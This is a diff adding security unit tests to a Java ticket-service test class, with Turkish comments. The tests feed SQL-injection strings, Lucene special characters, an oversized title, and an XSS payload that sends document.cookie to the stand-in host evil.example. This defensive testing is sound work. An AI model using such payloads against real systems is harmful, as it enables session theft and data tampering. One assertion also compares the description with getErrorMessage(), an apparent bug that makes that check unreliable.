@@ -359,4 +359,174 @@ public class TicketServiceTest {
 
         assertEquals(64, response.getServiceName().length());
     }
+
+    // ==========================================
+    // GÜVENLİK: ELASTICSEARCH SORGU INJECTION VE KÖTÜCÜL GİRDİ SENARYOLARI
+    //
+    // TicketRepository/ElasticsearchOperations burada mock'landığı için gerçek
+    // bir Elasticsearch sorgusunun tam olarak nasıl yürüdüğünü doğrulayamıyoruz;
+    // ama searchTickets/createTicket'ın kötücül girdi karşısında (a) exception
+    // fırlatmadığını, (b) girdiyi sorgu YAPISINI değiştiren bir şey olarak değil
+    // düz bir DEĞER olarak ele aldığını (query DSL'i .value(pattern) ile tip-güvenli
+    // builder'a veriyoruz, string concatenation ile JSON/sorgu gövdesi kurmuyoruz)
+    // doğruluyoruz. computeTicketId SHA-256 kullandığı için girdi ne olursa olsun
+    // ID üretimi de injection'a karşı doğası gereği bağışık.
+    // ==========================================
+
+    @SuppressWarnings("unchecked")
+    @Test
+    void testSearchTickets_SqlInjectionTarziPayload_CokmedenSorguOlusturur() {
+        // Given
+        SearchHits<TicketDocument> emptyHits = mock(SearchHits.class);
+        when(emptyHits.stream()).thenReturn(Stream.empty());
+        when(elasticsearchOperations.search(any(Query.class), eq(TicketDocument.class)))
+                .thenReturn(emptyHits);
+
+        String payload = "'; DROP TABLE tickets; --";
+
+        // When & Then
+        assertDoesNotThrow(() -> ticketService.searchTickets(payload));
+        verify(elasticsearchOperations).search(any(Query.class), eq(TicketDocument.class));
+        // Ticket'ların Elasticsearch dışında bir yolla (ör. tüm index çekilerek) hiç
+        // taranmadığını doğruluyoruz — arama gerçekten ES sorgusuna delege edilmiş
+        verify(ticketRepository, never()).findAll();
+    }
+
+    @SuppressWarnings("unchecked")
+    @Test
+    void testSearchTickets_LuceneOzelKarakterleriIcerenPayload_CokmedenCalisir() {
+        // Given: Elasticsearch/Lucene'de özel anlamı olan karakterler
+        // (* ? \ " { } [ ] ( ) ^ ~ : /) — sorgu DSL'ini bozmaya çalışan bir deneme
+        SearchHits<TicketDocument> emptyHits = mock(SearchHits.class);
+        when(emptyHits.stream()).thenReturn(Stream.empty());
+        when(elasticsearchOperations.search(any(Query.class), eq(TicketDocument.class)))
+                .thenReturn(emptyHits);
+
+        String payload = "*?\\\"{}[]()^~:/ OR *:*";
+
+        // When & Then
+        assertDoesNotThrow(() -> ticketService.searchTickets(payload));
+        verify(elasticsearchOperations).search(any(Query.class), eq(TicketDocument.class));
+    }
+
+    @Test
+    void testCreateTicket_SqlInjectionTarziBaslik_LiteralOlarakKaydedilirCokmez() {
+        // Given
+        when(ticketRepository.existsById(anyString())).thenReturn(false);
+        when(ticketRepository.save(any(TicketDocument.class))).thenAnswer(i -> i.getArgument(0));
+
+        CreateTicketRequest request = new CreateTicketRequest();
+        request.setTitle("'; DROP TABLE tickets; --");
+        request.setDescription("SQL injection denemesi başlıkta.");
+
+        // When
+        TicketResponse response = ticketService.createTicket(request, "kaanboldan");
+
+        // Then: başlık aynen (kaçışsız ama zararsız) saklanıyor, sadece normalize
+        // edilmiş (lowercase) hali id üretiminde kullanılıyor
+        assertEquals("'; DROP TABLE tickets; --", response.getTitle());
+        assertNotNull(response.getId());
+    }
+
+    @Test
+    void testCreateTicket_ElasticsearchOzelKarakterleriIcerenBaslik_HashIdUretirCokmez() {
+        // Given: ID üretimi SHA-256 hash'e dayandığı için, başlıkta hangi karakter
+        // olursa olsun (Lucene özel karakterleri dahil) çakışma/çökme olmamalı
+        when(ticketRepository.existsById(anyString())).thenReturn(false);
+        when(ticketRepository.save(any(TicketDocument.class))).thenAnswer(i -> i.getArgument(0));
+
+        CreateTicketRequest request = new CreateTicketRequest();
+        request.setTitle("*wildcard* \"quoted\" {json} [array] (paren) ^boost~2");
+        request.setDescription("Özel karakter testi.");
+
+        // When & Then
+        assertDoesNotThrow(() -> {
+            TicketResponse response = ticketService.createTicket(request, "kaanboldan");
+            assertNotNull(response.getId());
+            // 64 hex karakter = SHA-256 hash uzunluğu
+            assertEquals(64, response.getId().length());
+        });
+    }
+
+    @Test
+    void testCreateTicket_ScriptTagIcerenAciklama_LiteralOlarakKaydedilir() {
+        // Given: XSS tarzı payload — Elasticsearch/backend bunu çalıştırmaz,
+        // sadece metin olarak indeksler; render eden taraf escape etmekle yükümlü.
+        when(ticketRepository.existsById(anyString())).thenReturn(false);
+        when(ticketRepository.save(any(TicketDocument.class))).thenAnswer(i -> i.getArgument(0));
+
+        CreateTicketRequest request = new CreateTicketRequest();
+        request.setTitle("XSS testi");
+        request.setDescription("<script>fetch('https://evil.example/steal?c='+document.cookie)</script>");
+
+        TicketResponse response = ticketService.createTicket(request, "kaanboldan");
+
+        assertEquals(
+                "<script>fetch('https://evil.example/steal?c='+document.cookie)</script>",
+                response.getErrorMessage());
+    }
+
+    @Test
+    void testCreateTicket_AsiriUzunBaslik_CokmedenIslenir() {
+        // Given: 50.000 karakterlik başlık (DoS/stres tarzı girdi)
+        when(ticketRepository.existsById(anyString())).thenReturn(false);
+        when(ticketRepository.save(any(TicketDocument.class))).thenAnswer(i -> i.getArgument(0));
+
+        CreateTicketRequest request = new CreateTicketRequest();
+        request.setTitle("a".repeat(50_000));
+        request.setDescription("Aşırı uzun başlık stres testi.");
+
+        // When & Then: çökmemeli, hash üretimi sabit uzunlukta kalmalı
+        assertDoesNotThrow(() -> {
+            TicketResponse response = ticketService.createTicket(request, "kaanboldan");
+            assertEquals(64, response.getId().length());
+        });
+    }
+
+    @Test
+    void testCreateTicket_AyniInjectionPayloadIkiKezGonderilirse_TekKayidaBirlesir() {
+        // Given: aynı kötücül başlık iki kez gelirse (ör. otomatik saldırı denemesi
+        // tekrar tekrar aynı payload'ı gönderiyorsa) duplicate-merge mantığı
+        // yine çalışmalı — SQL injection payload'ı da diğer başlıklar gibi
+        // deterministik ID üretiminden geçer.
+        String payload = "' OR '1'='1' --";
+
+        when(ticketRepository.existsById(anyString()))
+                .thenReturn(false) // ilk çağrı: yok
+                .thenReturn(true); // ikinci çağrı: artık var
+
+        TicketDocument created = new TicketDocument();
+        when(ticketRepository.save(any(TicketDocument.class))).thenAnswer(i -> {
+            TicketDocument t = i.getArgument(0);
+            created.setId(t.getId());
+            created.setTitle(t.getTitle());
+            created.setTitleNormalized(t.getTitleNormalized());
+            created.setAiTags(t.getAiTags());
+            created.setOccurrenceCount(t.getOccurrenceCount());
+            created.setCreatedBy(t.getCreatedBy());
+            return created;
+        });
+
+        CreateTicketRequest request1 = new CreateTicketRequest();
+        request1.setTitle(payload);
+        request1.setDescription("İlk deneme");
+
+        when(ticketMutationExecutor.mutate(anyString(), any())).thenAnswer(invocation -> {
+            java.util.function.Consumer<TicketDocument> mutator = invocation.getArgument(1);
+            mutator.accept(created);
+            return created;
+        });
+
+        // When
+        TicketResponse first = ticketService.createTicket(request1, "saldirgan1");
+
+        CreateTicketRequest request2 = new CreateTicketRequest();
+        request2.setTitle(payload);
+        request2.setDescription("İkinci deneme");
+        TicketResponse second = ticketService.createTicket(request2, "saldirgan2");
+
+        // Then: iki ayrı ticket değil, tek kayıt (occurrence artışı)
+        assertEquals(first.getId(), second.getId());
+        verify(ticketRepository, times(1)).save(any(TicketDocument.class));
+    }
 }
